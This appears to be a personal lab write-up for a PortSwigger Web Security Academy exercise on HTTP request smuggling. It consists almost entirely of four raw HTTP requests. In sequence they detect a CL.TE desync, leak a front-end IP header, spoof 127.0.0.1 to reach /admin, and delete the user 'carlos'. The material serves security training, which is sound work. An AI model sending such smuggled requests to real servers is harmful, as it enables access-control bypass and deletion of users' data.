@@ -1,0 +1,67 @@
+Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
+PRACTITIONER
+ 
+Analysis:
+(1)
+POST / HTTP/1.1
+Host: 0aff00590450856180cd940400070038.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+x
+-------------> Timeout(CL.TE)
+(2)
+POST / HTTP/1.1
+Host: 0aff00590450856180cd940400070038.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Connection: close
+
+search=test
+------------> Gives X-eFmNOj-Ip:
+
+(3)
+POST / HTTP/1.1
+Host: 0aff00590450856180cd940400070038.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-eFmNOj-Ip: 127.0.0.1
+Content-Length: 10
+Connection: close
+
+x=1
+---------------> shows admin panel
+
+(4)
+POST / HTTP/1.1
+Host: 0aff00590450856180cd940400070038.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 166
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-eFmNOj-Ip: 127.0.0.1
+Content-Length: 10
+Connection: close
+
+x=1
+------------
